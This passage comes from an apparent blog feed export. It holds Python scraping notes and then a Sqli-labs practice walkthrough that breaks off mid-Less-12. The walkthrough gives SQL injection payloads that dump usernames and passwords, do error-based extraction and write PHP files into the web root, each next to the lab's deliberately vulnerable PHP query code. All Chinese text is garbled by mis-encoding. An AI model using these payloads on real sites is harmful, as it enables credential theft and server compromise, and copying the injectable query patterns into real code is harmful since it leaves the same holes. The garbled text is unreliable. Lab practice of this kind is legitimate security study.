align="center">r.content</td><td align="center">HTTPå“åº”å†…å®¹çš„äºŒè¿›åˆ¶å½¢å¼</td></tr></tbody></table><h2 id="Beautiful-Soup"><a href="#Beautiful-Soup" class="headerlink" title="Beautiful Soup"></a>Beautiful Soup</h2><p>ä¹Ÿå«beautifulsoup4æˆ–bs4</p><h3 id="åŸºæœ¬å…ƒç´ "><a href="#åŸºæœ¬å…ƒç´ " class="headerlink" title="åŸºæœ¬å…ƒç´ "></a>åŸºæœ¬å…ƒç´ </h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200215095808822.png" style="zoom:50%;" loading="lazy"><h3 id="éå†æ–¹æ³•"><a href="#éå†æ–¹æ³•" class="headerlink" title="éå†æ–¹æ³•"></a>éå†æ–¹æ³•</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200215102120777.png" style="zoom:33%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200215101930283.png" style="zoom: 50%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200215102442134.png" style="zoom:80%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200215102747676.png" style="zoom: 67%;" loading="lazy"><p>æ³¨ï¼šå¹³è¡Œéå†å‘ç”Ÿåœ¨åŒä¸€ä¸ªçˆ¶èŠ‚ç‚¹ä¸‹çš„å„èŠ‚ç‚¹é—´</p><p><code>prettify()</code>æ ¼å¼åŒ–è¾“å‡º</p><h3 id="å†…å®¹æŸ¥æ‰¾æ–¹æ³•"><a href="#å†…å®¹æŸ¥æ‰¾æ–¹æ³•" class="headerlink" title="å†…å®¹æŸ¥æ‰¾æ–¹æ³•"></a>å†…å®¹æŸ¥æ‰¾æ–¹æ³•</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200215110510847.png" style="zoom:67%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200215110603229.png" style="zoom:67%;" loading="lazy"><h3 id="Beautiful-Soupåº“è§£æå™¨"><a href="#Beautiful-Soupåº“è§£æå™¨" class="headerlink" title="Beautiful Soupåº“è§£æå™¨"></a>Beautiful Soupåº“è§£æå™¨</h3><table><thead><tr><th align="center">è§£æå™¨</th><th align="center">ä½¿ç”¨æ–¹æ³•</th><th align="center">æ¡ä»¶</th></tr></thead><tbody><tr><td align="center">bs4çš„HTMLè§£æå™¨</td><td align="center">BeautifulSoup(mk,â€™html.parserâ€™)</td><td align="center">å®‰è£…bs4åº“</td></tr><tr><td align="center">lxmlçš„HTMLè§£æå™¨</td><td align="center">BeautifulSoup(mk,â€™lxmlâ€™)</td><td align="center">pip install lxml</td></tr><tr><td align="center">lxmlçš„XMLè§£æå™¨</td><td align="center">BeautifulSoup(mk,â€™xmlâ€™)</td><td align="center">pip install lxml</td></tr><tr><td align="center">html5libçš„è§£æå™¨</td><td align="center">BeautifulSoup(mk,â€™html5libâ€™)</td><td align="center">pip install html5lib</td></tr></tbody></table><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><p>åŒ¹é…ä¸­æ–‡å­—ç¬¦ï¼š<code>[\u4e00-\u9fa5]</code></p><p>IPåœ°å€ï¼š<code>((?:(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d)\\.)&#123;3&#125;(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d))</code></p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200215171503658.png" style="zoom:67%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200215171657835.png" style="zoom:67%;" loading="lazy"><h3 id="compileå‡½æ•°"><a href="#compileå‡½æ•°" class="headerlink" title="compileå‡½æ•°"></a>compileå‡½æ•°</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200215172803741.png" style="zoom:67%;" loading="lazy"><h3 id="Matchå¯¹è±¡"><a href="#Matchå¯¹è±¡" class="headerlink" title="Matchå¯¹è±¡"></a>Matchå¯¹è±¡</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200215173026458.png" style="zoom:67%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200215173130093.png" style="zoom:67%;" loading="lazy"><h3 id="æœ€å°åŒ¹é…ï¼ˆéè´ªå©ªï¼‰"><a href="#æœ€å°åŒ¹é…ï¼ˆéè´ªå©ªï¼‰" class="headerlink" title="æœ€å°åŒ¹é…ï¼ˆéè´ªå©ªï¼‰"></a>æœ€å°åŒ¹é…ï¼ˆéè´ªå©ªï¼‰</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200215173716539.png" style="zoom:67%;" loading="lazy"><h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><p><a href="https://blog.csdn.net/github_36601823/article/details/77815013">å‚è€ƒ</a></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python%E7%AC%94%E8%AE%B0/20170903091548442.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python%E7%AC%94%E8%AE%B0/20170903091615951.png" alt loading="lazy"></p><h1 id="scrapyæ¡†æ¶"><a href="#scrapyæ¡†æ¶" class="headerlink" title="scrapyæ¡†æ¶"></a>scrapyæ¡†æ¶</h1><h2 id="ä¸»è¦ç»“æ„"><a href="#ä¸»è¦ç»“æ„" class="headerlink" title="ä¸»è¦ç»“æ„"></a>ä¸»è¦ç»“æ„</h2><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200217193013443.png" style="zoom:67%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200217193035116.png" style="zoom:67%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200217193058864.png" style="zoom:67%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200217193115484.png" style="zoom:67%;" loading="lazy"><h2 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h2><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200217193155782.png" style="zoom:67%;" loading="lazy"><h2 id="å·¥ç¨‹ç›®å½•"><a href="#å·¥ç¨‹ç›®å½•" class="headerlink" title="å·¥ç¨‹ç›®å½•"></a>å·¥ç¨‹ç›®å½•</h2><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200217193245769.png" style="zoom:67%;" loading="lazy"><h2 id="ç±»"><a href="#ç±»" class="headerlink" title="ç±»"></a>ç±»</h2><h3 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200217193435792.png" style="zoom:67%;" loading="lazy"><h3 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200217193520056.png" style="zoom:67%;" loading="lazy">]]></content>
      
      
      <categories>
          
          <category> å¤‡å¿˜å½• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sqli-labsé¶åœº</title>
      <link href="posts/e5cd0178/"/>
      <url>posts/e5cd0178/</url>
      
        <content type="html"><![CDATA[<h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a><strong>Less-</strong>1</h1><p>payload:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">?id&#x3D;0&#39; union select database(),group_concat(username),group_concat(password) from users--+</code></pre><p>php:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;</code></pre><span id="more"></span><h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a><strong>Less-</strong>2</h1><p>payload:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">?id&#x3D;0 union select 1,group_concat(username),group_concat(password) from users --+</code></pre><p>php:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;;</code></pre><h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a><strong>Less-3</strong></h1><p>payload:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">?id&#x3D;0&#39;) union select 1,group_concat(username),group_concat(password) from users --+</code></pre><p>php:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;(&#39;$id&#39;) LIMIT 0,1&quot;;</code></pre><h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a><strong>Less-</strong>4</h1><p>payload:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">?id&#x3D;0&quot;) union select 1,group_concat(username),group_concat(password) from users --+</code></pre><p>php:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">$id &#x3D; &#39;&quot;&#39; . $id . &#39;&quot;&#39;;$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;($id) LIMIT 0,1&quot;;</code></pre><h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a><strong>Less-</strong>5</h1><p>payload:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">?id&#x3D;0&#39; and extractvalue(1,concat(1,(select group_concat(username,&#39;:&#39;,password) from users where username!&#x3D;&#39;æ­¤å¤„åŠ å…¥æƒ³æ’é™¤çš„å­—ç¬¦ï¼Œå¯å¾€åæŸ¥æ‰¾&#39;)))--+</code></pre><p>php:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="5" color="#FFFF00">'</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string single-quoted-string">'You are in...........'</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="3" color="#FFFF00">'</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>&lt;/font>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#0000ff" font size= 3>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a><strong>Less-</strong>6</h1><p>payload:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">?id&#x3D;0&quot; and extractvalue(1,concat(1,(select group_concat(username,&#39;:&#39;,password) from users where username!&#x3D;&#39;æ­¤å¤„åŠ å…¥æƒ³æ’é™¤çš„å­—ç¬¦ï¼Œå¯å¾€åæŸ¥æ‰¾&#39;)))--+</code></pre><p>php:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">$id &#x3D; &#39;&quot;&#39;.$id.&#39;&quot;&#39;;$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;;ä¸‹é¢çš„åŒLess-5</code></pre><h1 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a><strong>Less-</strong>7</h1><p>Methodï¼šinto outfile æ–‡ä»¶å†™å…¥æ“ä½œï¼Œå¦‚ä¸‹ï¼š</p><p>payload:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">?id&#x3D;1&#39;)) union select 1,2,&#39;&#39; into outfile &quot;C:\\xampp\\htdocs\\sqli\\Less-7\\1.php&quot; --+</code></pre><p>php:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id=(('<span class="token interpolation"><span class="token variable">$id</span></span>')) LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#FFFF00">'</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string single-quoted-string">'You are in.... Use outfile......'</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#FFFF00">'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'You have an error in your SQL syntax'</span><span class="token punctuation">;</span><span class="token comment">//print_r(mysql_error());</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a><strong>Less-</strong>8</h1><p>payload:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">?id&#x3D;1&#39; union select 1,2,&#39;&#39; into outfile &quot;C:\\xampp\\htdocs\\sqli\\Less-8\\1.php&quot; --+</code></pre><p>php:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="5" color="#FFFF00">'</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string single-quoted-string">'You are in...........'</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="5" color="#FFFF00">'</span><span class="token punctuation">;</span><span class="token comment">//echo 'You are in...........';</span><span class="token comment">//print_r(mysql_error());</span><span class="token comment">//echo "You have an error in your SQL syntax";</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>&lt;/font>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#0000ff" font size= 3>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a><strong>Less-</strong>9</h1><p>payload:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">?id&#x3D;1&#39; union select 1,2,&#39;&#39; into outfile &quot;C:\\xampp\\htdocs\\sqli\\Less-9\\1.php&quot; --+</code></pre><p>php:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="5" color="#FFFF00">'</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string single-quoted-string">'You are in...........'</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="5" color="#FFFF00">'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'You are in...........'</span><span class="token punctuation">;</span><span class="token comment">//print_r(mysql_error());</span><span class="token comment">//echo "You have an error in your SQL syntax";</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>&lt;/font>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#0000ff" font size= 3>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a><strong>Less-</strong>10</h1><p>payload:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">?id&#x3D;1&quot; union select 1,2,&#39;&#39; into outfile &quot;C:\\xampp\\htdocs\\sqli\\Less-10\\1.php&quot; --+</code></pre><p>php:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'"'</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token operator">.</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id=<span class="token interpolation"><span class="token variable">$id</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="5" color="#FFFF00">'</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string single-quoted-string">'You are in...........'</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="5" color="#FFFF00">'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'You are in...........'</span><span class="token punctuation">;</span><span class="token comment">//print_r(mysql_error());</span><span class="token comment">//echo "You have an error in your SQL syntax";</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>&lt;/font>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#0000ff" font size= 3>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a><strong>Less-</strong>11</h1><p>payload:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">uname: 1&#39; union select group_concat(username),group_concat(password) from users;#</code></pre><p>php:</p><pre class="language-php" data-language="php"><code class="language-php">@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT username, password FROM users WHERE username='<span class="token interpolation"><span class="token variable">$uname</span></span>' and password='<span class="token interpolation"><span class="token variable">$passwd</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">//echo '&lt;font color= "#0000ff">';</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#FFFF00" font size = 4>'</span><span class="token punctuation">;</span><span class="token comment">//echo " You Have successfully logged in\n\n " ;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="3" color="#0000ff">'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your Login name:'</span><span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your Password:'</span> <span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="../images/flag.jpg"  />'</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span>  <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#0000ff" font size="3">'</span><span class="token punctuation">;</span><span class="token comment">//echo "Try again looser";</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="../images/slap.jpg" />'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><h1 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a><strong>Less-</strong>12</h1><p>payload:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">uname: 1&quot;) union select group_concat(username),group_concat(password) from users;#</code></pre><p>php:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$uname</span><span class="token operator">=</span><span class="token string single-quoted-string">'"'</span><span class="token operator">.</span><span class="token variable">$uname</span><span class="token operator">.</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span><span class="token variable">$passwd</span><span class="token operator">=</span><span class="token string single-quoted-string">'"'</span><span class="token operator">.</span><span class="token variable">$passwd</span><span class="token operator">.</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span> @<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT username, password FROM users WHERE username=(<span class="token interpolation"><span class="token variable">$uname</span></span>) and password=(<span class="token interpolation"><span class="token variable">$passwd</span></span>) LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">//echo '&lt;font color= "#0000ff">';</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#FFFF00" font size = 4>'</span><span class="token punctuation">;</span><span class="token comment">//echo " You Have successfully logged in " ;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="3" color="#0000ff">'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your Login name:'</span><span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your Password:'</span> <span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="../images/flag.jpg"   />'</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span>  <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#0000ff" font size="3">'</span><span class="token punctuation">;</span><span class="token comment">//echo "Try again looser";</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token 